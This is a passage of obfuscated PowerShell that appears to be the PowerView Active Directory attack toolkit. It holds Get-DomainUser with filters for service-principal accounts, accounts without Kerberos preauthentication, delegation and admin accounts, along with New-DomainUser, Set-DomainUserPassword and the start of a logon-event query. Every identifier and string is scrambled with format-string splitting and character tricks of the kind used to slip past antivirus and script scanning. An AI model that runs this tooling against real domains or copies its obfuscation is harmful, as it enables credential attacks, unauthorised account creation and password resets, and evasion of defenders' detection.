        if (${P`sBOunDpA`Rame`TErs}[("{3}{0}{1}{2}" -f'ultPa','geSiz','e','Res')]) { ${S`e`Ar`ch`ERa`RGumeNTs}[("{3}{2}{1}{4}{0}"-f 'e','ageSi','sultP','Re','z')] = ${reSuLTpA`GEs`iZe} }
        if (${psb`oUND`pARAM`eTerS}[("{3}{1}{2}{0}" -f'imit','rTim','eL','Serve')]) { ${SE`Arch`ER`ArGum`EntS}[("{3}{0}{4}{2}{1}"-f'T','Limit','me','Server','i')] = ${SER`V`eRtIMe`L`IMIT} }
        if (${p`SB`oUnDPArAM`Et`ErS}[("{0}{2}{1}" -f'Se','sks','curityMa')]) { ${Se`A`RChe`RArGU`mEnts}[("{1}{2}{0}{3}"-f 'tyMa','Sec','uri','sks')] = ${seCuRiT`yM`A`SKS} }
        if (${p`sBOuNdpARa`mE`T`erS}[("{1}{2}{0}"-f'one','Tombs','t')]) { ${Se`ArCh`er`A`R`GuMENtS}[("{1}{2}{0}"-f 'one','Tombs','t')] = ${toM`B`StOne} }
        if (${psB`O`UnDpAraMEtE`RS}[("{1}{0}{2}" -f 'nt','Crede','ial')]) { ${SeaRCHe`Ra`R`gum`enTS}[("{0}{2}{1}" -f 'Cr','dential','e')] = ${cred`enT`Ial} }
        ${US`er`SeaR`c`hEr} = &("{3}{1}{0}{2}"-f 'i','oma','nSearcher','Get-D') @SearcherArguments
    }

    PROCESS {
        
        if (${pS`BO`UNdParaMeT`eRs} -and (${P`S`BO`Undp`A`RaMEtErS}."coU`Nt" -ne 0)) {
            &("{4}{1}{5}{2}{0}{3}"-f 'et','ew-D','Param','er','N','ynamic') -CreateVariables -BoundParameters ${P`SboUNdpAr`AME`TERS}
        }

        if (${usersE`AR`chEr}) {
            ${Id`e`N`T`ItyfILtER} = ''
            ${fI`lT`eR} = ''
            ${iDeNt`i`TY} | &("{0}{2}{1}"-f'Whe','bject','re-O') {${_}} | &("{2}{1}{0}"-f'Each-Object','r','Fo') {
                ${IdeNT`i`TY`InS`TaN`CE} = ${_}.("{1}{2}{0}"-f 'e','Rep','lac').Invoke('(', '\28').("{1}{2}{0}"-f'lace','R','ep').Invoke(')', '\29')
                if (${iden`TiTYi`NStAN`ce} -match ("{0}{1}" -f '^S-1','-')) {
                    ${IDEnTiTyf`ilT`ER} += "(objectsid=$IdentityInstance)"
                }
                elseif (${IdEN`TI`TYiN`StAN`Ce} -match ("{1}{0}" -f 'N=','^C')) {
                    ${IDEn`TiTY`F`ilTer} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${pS`BO`UnDpar`Ame`T`ERS}[("{1}{0}"-f 'ain','Dom')]) -and (-not ${pS`BOu`ND`parameTerS}[("{1}{0}{2}" -f'a','Se','rchBase')])) {
                        
                        
                        ${IdeN`TIT`Y`doMaIn} = ${idE`NtIty`InS`TANCE}.("{1}{0}{2}" -f 't','SubS','ring').Invoke(${I`DeN`T`ity`I`NstancE}.("{1}{0}" -f'dexOf','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{3}{2}{1}{0}"-f 'e','Verbos','te-','Wri') ('[Ge'+'t-'+'Dom'+'ainU'+'ser] '+'Ex'+'t'+'ra'+'cted '+'do'+'main '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${seA`R`CHeR`ARGuM`ENTs}[("{2}{0}{1}"-f'i','n','Doma')] = ${ID`EntIT`ydo`mAIn}
                        ${useRsEa`R`c`HeR} = &("{0}{1}{2}{3}"-f 'Get-Doma','inS','e','archer') @SearcherArguments
                        if (-not ${U`s`erseArCH`ER}) {
                            &("{2}{3}{0}{1}"-f 'rni','ng','W','rite-Wa') ('[G'+'e'+'t-DomainUser'+'] '+'Un'+'ab'+'le '+'t'+'o '+'ret'+'rieve '+'do'+'main '+'search'+'e'+'r '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${ide`NTiTYINs`T`An`CE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${guidb`YteS`TRI`NG} = (([Guid]${IDEn`TIT`y`i`N`STaNCe}).("{0}{1}{2}{3}"-f'T','oByte','A','rray').Invoke() | &("{1}{2}{0}"-f'ject','F','orEach-Ob') { '\' + ${_}.("{0}{2}{1}" -f'ToSt','ng','ri').Invoke('X2') }) -join ''
                    ${i`DE`Nt`iTyFiL`Ter} += "(objectguid=$GuidByteString)"
                }
                elseif (${IDeN`T`iT`YI`NStaNCe}.("{0}{1}{2}"-f'Con','ta','ins').Invoke('\')) {
                    ${CONV`Ert`EDIDEn`TIt`YI`N`St`ANce} = ${iDenTITY`In`s`TANce}.("{2}{0}{1}"-f 'c','e','Repla').Invoke('\28', '(').("{0}{1}"-f'Repl','ace').Invoke('\29', ')') | &("{2}{1}{0}{3}"-f 'DN','rt-A','Conve','ame') -OutputType ("{1}{2}{0}" -f'al','Can','onic')
                    if (${CoNVE`Rt`edIDe`N`TIt`y`iN`StANCE}) {
                        ${US`eR`Do`MaiN} = ${c`oNVe`Rte`diDeNT`I`TYinS`TANCe}.("{1}{0}{2}"-f 'St','Sub','ring').Invoke(0, ${Co`Nv`Er`TedID`ENti`Ty`InSTaN`CE}.("{2}{0}{1}" -f'ndexO','f','I').Invoke('/'))
                        ${US`e`RNAme} = ${id`E`NtITYINS`T`A`NcE}.("{1}{0}" -f't','Spli').Invoke('\')[1]
                        ${idenT`It`yf`i`ltER} += "(samAccountName=$UserName)"
                        ${SEa`RChEr`A`R`gumENTS}[("{0}{1}" -f'Domai','n')] = ${U`sEr`doMa`in}
                        &("{1}{2}{3}{0}"-f 'rbose','W','rit','e-Ve') ('[G'+'et-Dom'+'ainUse'+'r] '+'Extr'+'act'+'ed '+'do'+'ma'+'in '+"'$UserDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${U`SERsEAR`chEr} = &("{0}{1}{4}{2}{3}"-f'Ge','t-Do','ai','nSearcher','m') @SearcherArguments
                    }
                }
                else {
                    ${Id`eNtI`Tyf`ilt`er} += "(samAccountName=$IdentityInstance)"
                }
            }

            if (${I`d`entiT`Yf`iLtER} -and (${IDe`NtIty`FI`LteR}.("{0}{1}" -f'Tri','m').Invoke() -ne '') ) {
                ${F`ILTEr} += "(|$IdentityFilter)"
            }

            if (${PSboun`D`parA`MeTERS}['SPN']) {
                &("{3}{2}{1}{0}"-f'ose','erb','e-V','Writ') ("{0}{2}{7}{9}{11}{1}{4}{12}{8}{10}{6}{3}{5}" -f '[','Searching for non','Get-Dom','al','-n',' names',' princip','ai','ll','nUse',' service','r] ','u')
                ${F`iLt`er} += ("{2}{5}{4}{0}{1}{3}" -f 'ePri','ncipalN','(s','ame=*)','vic','er')
            }
            if (${Ps`BOuNdp`ArA`M`e`TERs}[("{0}{1}{3}{2}{4}" -f 'AllowDel','e','io','gat','n')]) {
                &("{0}{2}{3}{1}"-f'Wri','ose','te-','Verb') ("{6}{0}{7}{3}{12}{9}{1}{11}{8}{2}{10}{5}{4}"-f 'r] ',' w',' ','arching for u','gated','e dele','[Get-DomainUse','Se','can','s','b','ho ','ser')
                
                ${Fi`L`TER} += ((("{5}{10}{12}{1}{0}{7}{11}{2}{9}{8}{6}{3}{4}" -f'ol:1','tContr','556.','485','74))','(!(userA','=10','.2.840.','.803:','1.4','cc','113','oun')))
            }
            if (${PsbOu`Ndp`A`RA`mEtErS}[("{4}{2}{1}{3}{0}"-f 'tion','e','wD','lega','Disallo')]) {
                &("{2}{1}{0}" -f'-Verbose','te','Wri') ("{17}{1}{14}{7}{8}{6}{3}{16}{0}{10}{4}{12}{15}{18}{2}{9}{5}{13}{11}"-f'e sens','c','no','e','ti','te',' for us','n','g','t trus','i','delegation','ve ','d for ','hi','a','rs who ar','[Get-DomainUser] Sear','nd ')
                ${f`ILter} += ("{7}{11}{9}{6}{2}{13}{8}{15}{4}{5}{1}{0}{3}{14}{10}{12}" -f '.','6.1','nt','4.803','.','2.840.11355','ou','(u','on','rAcc','=1048574','se',')','C',':','trol:1')
            }
            if (${PS`B`o`U`Ndpar`AmeterS}[("{2}{1}{0}" -f't','minCoun','Ad')]) {
                &("{1}{2}{0}"-f'erbose','W','rite-V') ("{2}{5}{6}{0}{7}{9}{8}{3}{4}{1}"-f 'inUser] Sear','1','[Get-',' adminC','ount=','Do','ma','ching ','or','f')
                ${fIl`TeR} += (("{3}{0}{2}{4}{1}" -f'd',')','m','(a','incount=1'))
            }
            if (${PsBOUndPaRaM`e`T`Ers}[("{1}{0}{2}{3}"-f 'u','Tr','stedToAut','h')]) {
                &("{2}{0}{1}{3}" -f 'ite-Verb','os','Wr','e') ("{13}{20}{22}{7}{16}{24}{12}{10}{26}{21}{0}{9}{18}{11}{3}{23}{4}{14}{6}{5}{19}{25}{15}{17}{8}{2}{1}"-f's ','pals','i','usted to','uth','icate','t','se','rinc','that','i','r','rch','[Get-Dom','en','he','r] S','r p',' are t',' ','ai',' user','nU',' a','ea','for ot','ng for')
                ${F`i`lTER} += ("{5}{2}{1}{0}{4}{3}{6}"-f 'edtodel','ow','ds-all','teto=*','ega','(ms',')')
            }
            if (${pSB`ou`Nd`P`Aramet`ERS}[("{0}{3}{4}{1}{2}" -f 'Preau','r','ed','th','NotRequi')]) {
                &("{4}{2}{1}{0}{3}" -f 'os','rb','e-Ve','e','Writ') ("{7}{12}{2}{8}{3}{11}{9}{5}{0}{1}{10}{13}{6}{4}"-f 'cc','ounts that do not ','ainU','earching ','ticate','er a','hen','[G','ser] S','or us','req','f','et-Dom','uire kerberos preaut')
                ${fiL`T`Er} += ("{1}{0}{5}{7}{6}{4}{2}{8}{3}" -f 'serAccount','(u',':1.2.840','.4.803:=4194304)','rol','Co','t','n','.113556.1')
            }
            if (${PS`BoUNdp`Ar`A`Me`TERs}[("{2}{0}{1}"-f'PFil','ter','LDA')]) {
                &("{1}{2}{0}"-f'erbose','Write','-V') ('[Get-Dom'+'ainUse'+'r'+']'+' '+'Using'+' '+'ad'+'d'+'it'+'ional '+'LDAP'+' '+'filter'+': '+"$LDAPFilter")
                ${fIl`T`er} += "$LDAPFilter"
            }

            
            ${U`Ac`FIlter} | &("{0}{2}{1}" -f 'W','ect','here-Obj') {${_}} | &("{1}{0}{2}" -f'Each-Obj','For','ect') {
                if (${_} -match ("{0}{1}"-f 'N','OT_.*')) {
                    ${U`AC`FiELd} = ${_}.("{0}{2}{1}"-f'S','string','ub').Invoke(4)
                    ${u`ACV`Alue} = [Int](${uac`E`NUm}::${uA`cfiE`lD})
                    ${f`IlteR} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${U`AC`ValUE} = [Int](${u`AcE`Num}::${_})
                    ${F`iLT`Er} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${use`R`s`E`ArcHEr}."fi`LteR" = "(&(samAccountType=805306368)$Filter)"
            &("{2}{1}{0}" -f'ose','Verb','Write-') "[Get-DomainUser] filter string: $($UserSearcher.filter) "

            if (${PSb`O`U`NdpArameTERs}[("{0}{1}{2}"-f'Fi','ndO','ne')]) { ${r`eS`UltS} = ${USeR`s`EA`RCh`er}.("{2}{0}{1}"-f'n','e','FindO').Invoke() }
            else { ${rES`ULTs} = ${Us`ER`sear`C`hER}.("{2}{1}{0}" -f 'All','nd','Fi').Invoke() }
            ${rESU`L`TS} | &("{3}{0}{2}{1}" -f'-Obj','t','ec','Where') {${_}} | &("{0}{2}{1}{3}"-f'Fo','c','rEach-Obje','t') {
                if (${Psb`oUNd`ParameT`ERS}['Raw']) {
                    
                    ${u`seR} = ${_}
                    ${Us`Er}."PS`oBje`cT"."tyPEN`AmEs".("{1}{0}"-f 'rt','Inse').Invoke(0, ("{0}{2}{3}{4}{5}{1}" -f 'P','aw','owerView.','Us','er','.R'))
                }
                else {
                    ${us`ER} = &("{2}{1}{4}{0}{3}" -f'e','P','Convert-LDAP','rty','rop') -Properties ${_}."pr`Op`eRTIes"
                    ${us`er}."pS`O`BjeCT"."typ`EnAm`ES".("{1}{0}"-f't','Inser').Invoke(0, ("{1}{2}{0}"-f'ser','Powe','rView.U'))
                }
                ${US`eR}
            }
            if (${r`eSuLTS}) {
                try { ${re`sULTs}.("{2}{0}{1}" -f'spos','e','di').Invoke() }
                catch {
                    &("{0}{3}{1}{2}"-f'Write-','erbo','se','V') ('['+'Get-Do'+'m'+'ainU'+'ser] '+'E'+'rror '+'d'+'i'+'sposing '+'of'+' '+'the'+' '+'R'+'esults '+'o'+'bje'+'ct: '+"$_")
                }
            }
            ${uSE`RS`eaR`C`hER}.("{1}{0}" -f 'ispose','d').Invoke()
        }
    }
}


function n`e`W-DomaIN`USEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{6}{4}{7}{5}{9}{0}{1}{2}{8}" -f 'Changi','ngFun','c','PSU','ces','Fo','seShouldPro','s','tions','rState'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{3}{1}"-f'PS','ocess','ShouldP','r'}, '')]
    [OutputType({"{6}{5}{3}{2}{7}{4}{1}{8}{0}"-f 'l','rPrinc','nt','cou','.Use','rvices.Ac','DirectorySe','Management','ipa'})]
    Param(
        [Parameter(mANDatorY = ${TR`UE})]
        [ValidateLength(0, 256)]
        [String]
        ${SAma`C`coUN`TNA`me},

        [Parameter(mAnDaTory = ${T`RUE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'ssword','Pa'})]
        [Security.SecureString]
        ${a`CcO`UnTp`AsSWORd},

        [ValidateNotNullOrEmpty()]
        [String]
        ${na`me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DiS`p`lAy`NAME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DE`ScRip`TIoN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`mA`iN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREd`ENtI`Al} =   ( itEm  VarIablE:21GV7e).ValUE::"Emp`TY"
    )

    ${Co`NTe`xTAr`gUmE`Nts} = @{
        ("{1}{2}{0}" -f 'y','I','dentit') = ${SAm`AC`CouNt`NAmE}
    }
    if (${PS`B`oun`dparAMeT`e`RS}[("{0}{2}{1}" -f 'D','in','oma')]) { ${c`O`NtE`XTArG`Um`eNtS}[("{1}{2}{0}" -f'n','D','omai')] = ${d`oMaiN} }
    if (${PSbo`U`ND`PaRAMETe`Rs}[("{3}{0}{1}{2}"-f 'd','en','tial','Cre')]) { ${c`onTe`xta`RgUments}[("{2}{0}{1}" -f'edentia','l','Cr')] = ${C`Re`D`entIAL} }
    ${C`ONTe`Xt} = &("{4}{5}{2}{0}{1}{3}"-f'ci','pal','rin','Context','Ge','t-P') @ContextArguments

    if (${c`OnTe`Xt}) {
        ${U`SEr} = &("{0}{1}{2}"-f'New','-O','bject') -TypeName ("{9}{6}{10}{2}{8}{0}{5}{11}{7}{12}{3}{4}{13}{1}" -f'ctory','cipal','Di','g','ement.U','Services.Account','e','n','re','Syst','m.','Ma','a','serPrin') -ArgumentList (${C`ONt`EXt}."cOn`T`eXT")

        
        ${Us`eR}."SAmA`CcoU`N`T`NAme" = ${c`oN`TeXt}."ID`entITy"
        ${t`em`PcR`ed} = &("{2}{1}{0}{3}"-f 'bj','-O','New','ect') ("{3}{2}{7}{11}{10}{5}{6}{9}{4}{8}{1}{0}" -f'l','ia','s','Sy','SCred','ut','omation.','tem.Manage','ent','P','A','ment.')('a', ${ac`COuNt`p`ASSW`ORD})
        ${u`ser}.("{0}{1}{2}"-f 'S','etPa','ssword').Invoke(${TemP`c`RED}.("{3}{2}{0}{1}"-f'twork','Credential','e','GetN').Invoke()."PASS`wO`RD")
        ${uS`ER}."E`NAblED" = ${TR`UE}
        ${u`SeR}."pasSW`OR`DnO`Tre`QUir`Ed" = ${f`A`lse}

        if (${psB`OU`NdPAR`Am`E`TeRS}[("{0}{1}" -f 'Na','me')]) {
            ${us`er}."nA`me" = ${Na`Me}
        }
        else {
            ${u`SEr}."nA`ME" = ${cOnt`eXt}."iDen`Ti`Ty"
        }
        if (${psBounDpAR`AMe`T`ErS}[("{1}{2}{0}"-f 'e','Display','Nam')]) {
            ${U`Ser}."dIs`PLAY`Na`Me" = ${di`sP`lAY`NAme}
        }
        else {
            ${U`SER}."dIS`P`la`YnAme" = ${cO`Nte`xt}."idE`NtI`TY"
        }

        if (${p`sBouNdPar`AME`TE`Rs}[("{1}{0}{2}"-f 'escriptio','D','n')]) {
            ${U`sER}."dEsCrI`p`T`Ion" = ${d`Es`CRiPTi`on}
        }

        &("{1}{2}{0}"-f'rbose','Wri','te-Ve') ('[New'+'-Domain'+'Us'+'er] '+'Attempt'+'in'+'g '+'t'+'o '+'c'+'re'+'ate '+'user'+' '+"'$SamAccountName'")
        try {
            ${nU`ll} = ${US`Er}.("{0}{1}" -f 'S','ave').Invoke()
            &("{1}{2}{0}" -f'se','Write-Verb','o') ('[N'+'ew-D'+'om'+'a'+'inUser'+'] '+'Us'+'er '+"'$SamAccountName' "+'su'+'ccessful'+'ly '+'crea'+'te'+'d')
            ${uS`er}
        }
        catch {
            &("{0}{1}{3}{2}"-f 'Writ','e','arning','-W') ('[N'+'e'+'w-DomainUs'+'er] '+'Err'+'or '+'creat'+'i'+'ng '+'us'+'er '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function sE`T-dO`mainu`SeR`PasS`wOrd {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{8}{2}{3}{7}{0}{5}{1}{4}{6}"-f'oce','tateChang','S','ho','ingFu','ssForS','nctions','uldPr','PSUse'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}" -f 'roc','PSShouldP','ss','e'}, '')]
    [OutputType({"{1}{2}{6}{7}{9}{8}{5}{4}{3}{0}" -f'l','Dire','cto','a','anagement.UserPrincip','tM','ryServi','ces.','n','Accou'})]
    Param(
        [Parameter(POsITION = 0, MANDatOrY = ${TR`UE})]
        [Alias({"{0}{2}{1}"-f 'U','ame','serN'}, {"{1}{2}{0}" -f'rIdentity','U','se'}, {"{0}{1}"-f 'Use','r'})]
        [String]
        ${i`d`enTiTY},

        [Parameter(MANdATorY = ${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f 'Pa','s','sword'})]
        [Security.SecureString]
        ${acCOuN`TPa`ss`WORD},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OMain},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`denT`iAL} =  $21GV7e::"E`mpTY"
    )

    ${C`on`TE`xT`ArgumENTs} = @{ ("{0}{2}{1}" -f 'Id','ntity','e') = ${Ide`N`TITY} }
    if (${Psbo`UndPara`mE`T`ers}[("{0}{1}"-f 'Doma','in')]) { ${Co`NtE`xTa`RguM`entS}[("{1}{0}"-f'n','Domai')] = ${dom`AiN} }
    if (${Psbo`Un`Dpa`RA`MEtERs}[("{1}{2}{0}" -f'al','Credent','i')]) { ${cONTextArGu`M`e`NtS}[("{2}{0}{1}"-f 'dent','ial','Cre')] = ${c`RED`eNTiaL} }
    ${C`ontExT} = &("{4}{5}{2}{3}{0}{1}" -f'Con','text','nci','pal','Get-','Pri') @ContextArguments

    if (${Con`T`EXt}) {
        ${U`sEr} = [System.DirectoryServices.AccountManagement.UserPrincipal]::("{1}{4}{2}{0}{3}" -f'Ident','Fin','y','ity','dB').Invoke(${co`N`TExT}."CONTe`xT", ${iD`e`NTIty})

        if (${u`SeR}) {
            &("{3}{1}{2}{4}{0}" -f 'ose','r','ite-V','W','erb') ('[Se'+'t'+'-D'+'omainUser'+'Pas'+'swor'+'d] '+'A'+'ttem'+'pting '+'to'+' '+'se'+'t '+'t'+'he '+'pass'+'wo'+'rd '+'f'+'or '+'user'+' '+"'$Identity'")
            try {
                ${tE`MPC`RED} = &("{1}{0}{2}" -f 'ew-Obje','N','ct') ("{5}{1}{4}{0}{3}{7}{2}{8}{6}" -f'nt.Autom','an','ede','atio','ageme','System.M','al','n.PSCr','nti')('a', ${acCouNtpA`s`SwOrD})
                ${us`Er}.("{3}{0}{2}{1}" -f'as','d','swor','SetP').Invoke(${TEmp`C`ReD}.("{1}{3}{0}{2}" -f 'tworkCred','Get','ential','Ne').Invoke()."pASS`wOrD")

                ${Nu`LL} = ${uS`Er}.("{0}{1}" -f'Sa','ve').Invoke()
                &("{1}{2}{0}{3}{4}" -f 'ite-','W','r','V','erbose') ('[Set-Do'+'mai'+'nU'+'serPassw'+'ord] '+'Passwo'+'rd'+' '+'fo'+'r '+'us'+'er '+"'$Identity' "+'suc'+'cessfully'+' '+'rese'+'t')
            }
            catch {
                &("{3}{1}{2}{0}" -f 'ning','rit','e-War','W') ('[S'+'et-Doma'+'inU'+'serP'+'assword] '+'Err'+'o'+'r '+'se'+'tting '+'passwo'+'r'+'d '+'f'+'or '+'use'+'r '+"'$Identity' "+': '+"$_")
            }
        }
        else {
            &("{0}{2}{1}{3}"-f'Writ','a','e-W','rning') ('[Set-Domain'+'UserPa'+'s'+'s'+'w'+'ord] '+'U'+'nab'+'le '+'t'+'o '+'fin'+'d '+'user'+' '+"'$Identity'")
        }
    }
}


function G`eT`-doMA`INuSE`REVEnt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{1}"-f 'r','ocess','PSShou','ldP'}, '')]
    [OutputType({"{1}{2}{3}{0}{4}"-f 'n','PowerV','iew.LogonEv','e','t'})]
    [OutputType({"{6}{3}{1}{4}{0}{2}{5}" -f'ogo','C','nEve','erView.Explicit','redentialL','nt','Pow'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsition = 0, vAlUEFROmPIpElIne = ${T`RUE}, VALuefROmpiPElINeBYpRopERTYname = ${t`RuE})]
        [Alias({"{1}{2}{0}{3}" -f 'st','d','nsho','name'}, {"{0}{1}" -f'HostN','ame'}, {"{1}{0}" -f 'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${coM`pu`TERn`AmE} = ${eNv:C`o`mPut`E`RName},

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${St`Ar`T`TimE} =  (  VaRIaBLe ("E"+"Zy")).vAlUE::"n`ow".("{0}{2}{1}"-f'Add','ys','Da').Invoke(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${E`N`dtiME} =   $EZy::"N`ow",

        [ValidateRange(1, 1000000)]
        [Int]
        ${maxe`VeN`Ts} = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creDenT`i`Al} =   (  vaRIaBlE 21Gv7E  -VaLueonl  )::"e`mpTY"
    )

    BEGIN {
        
        ${Xpa`THfilT`ER} = ((('P'+'B'+'8
<Q'+'ueryLi'+'st>
'+' ')-cREplAcE 'PB8',[cHAR]34)+' '+' '+' '+'<Quer'+'y'+' '+('I'+'d={0}0{0}'+' ') -f[CHAR]34+(('Path'+'='+'Yw'+'HSecu'+'rityY'+'wH>

 ') -RePLACE([CHAr]89+[CHAr]119+[CHAr]72),[CHAr]34)+' '+' '+' '+' '+' '+' '+' '+'<!-'+'- '+'Logo'+'n '+'event'+'s'+' '+'--'+'>
 '+' '+' '+' '+' '+' '+' '+' '+'<'+'Sele'+'ct '+(('Pa'+'th='+'IKe'+'Secu'+'rit'+'yIKe>
'+' ') -CrEplACE 'IKe',[ChaR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'System['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Pr'+'ov'+'i'+'der[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@'+'Nam'+'e=c1'+'hMicrosof'+'t-Wi'+'ndows-Secur'+'ity'+'-Au'+'d'+'it'+'in'+'g'+'c1h
 ')."ReP`LACE"('c1h',[stRIng][ChaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'nd '+'(Lev'+'el=4'+' '+'or'+' '+'Leve'+'l=0)'+' '+'a'+'nd '+'(Event'+'ID=462'+'4'+')
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d '+'T'+'imeC'+'r'+'e'+'ated[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@SystemTime&gt;=hdynxl'+'(nxlStar'+'tT'+'im'+'e.To'+'U'+'niver'+'salT'+'i'+'me().To'+'S'+'tr'+'ing(hdyshdy))hdy ')  -rEplaCE ([CHaR]110+[CHaR]120+[CHaR]108),[CHaR]36-rEplaCE'hdy',[CHaR]39)+'an'+'d '+(('@'+'SystemTi'+'m'+'e&lt'+';'+'=sWH43t('+'4'+'3'+'tEndTi'+'me.ToUniversalTi'+'me().ToSt'+'ring(sWHssWH))sWH'+'
 ')-replaCE 'sWH',[ChAr]39-CREpLaCE'43t',[ChAr]36)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('*'+'[Ev'+'entDa'+'t'+'a['+'Data[@Nam'+'e=3oCTargetUserNa'+'me3oC'+'] ')."R`e`plACE"(([cHAR]51+[cHAR]111+[cHAR]67),[stRiNG][cHAR]39)+'!='+' '+('XQ'+'dANONYMOUS'+' ')."REP`LACE"(([CHar]88+[CHar]81+[CHar]100),[sTRing][CHar]39)+('L'+'OGO'+'NTyY]]'+'
 ')."r`epL`AcE"(([cHAR]84+[cHAR]121+[cHAR]89),[StrIng][cHAR]39)+' '+' '+' '+' '+' '+' '+' '+'<'+'/'+'Select>

 '+' '+' '+' '+' '+' '+' '+' '+'<!--'+' '+'Logo'+'n '+'with'+' '+'exp'+'lici'+'t '+'creden'+'ti'+'al'+' '+'ev'+'ents '+'--'+'>
 '+' '+' '+' '+' '+' '+' '+' '+'<Select'+' '+('P'+'ath='+'y'+'JESecuri'+'ty'+'y'+'JE>
 ')."reP`l`ACE"('yJE',[strIng][cHAR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Sys'+'tem[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Pr'+'ovid'+'e'+'r[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@Name='+'vy'+'3Microso'+'ft'+'-'+'Wi'+'ndow'+'s'+'-S'+'ecur'+'ity-A'+'udi'+'t'+'ingvy3
 ')."re`PlacE"('vy3',[stRIng][char]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+' '+'(Lev'+'el=4'+' '+'o'+'r '+'Leve'+'l=0'+') '+'a'+'nd '+'(EventID'+'=464'+'8)'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d '+'T'+'imeC'+'reated'+'['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@S'+'ystemTim'+'e&'+'gt;=sS'+'L'+'UOv'+'('+'U'+'Ov'+'S'+'tartTime.'+'T'+'oUnive'+'rsalTime().'+'ToSt'+'ri'+'ng(sSL'+'ssSL)'+')sS'+'L ')."R`EP`LaCE"(([ChAR]115+[ChAR]83+[ChAR]76),[sTRing][ChAR]39)."REpl`A`CE"(([ChAR]85+[ChAR]79+[ChAR]118),'$')+'an'+'d '+('@S'+'yst'+'em'+'Time&lt;={1}{0}('+'{'+'0}EndTim'+'e.T'+'oUniv'+'ers'+'al'+'T'+'ime('+').ToSt'+'ri'+'ng'+'({'+'1'+'}s'+'{1'+'})){1}
 ')-f[CHAR]36,[CHAR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+'</Selec'+'t'+'>
'+'
 '+' '+' '+' '+' '+' '+' '+' '+'<'+'Su'+'ppres'+'s '+(('Path'+'=YGqSecur'+'i'+'t'+'yYGq>
 ') -ReplacE ([cHAR]89+[cHAR]71+[cHAR]113),[cHAR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
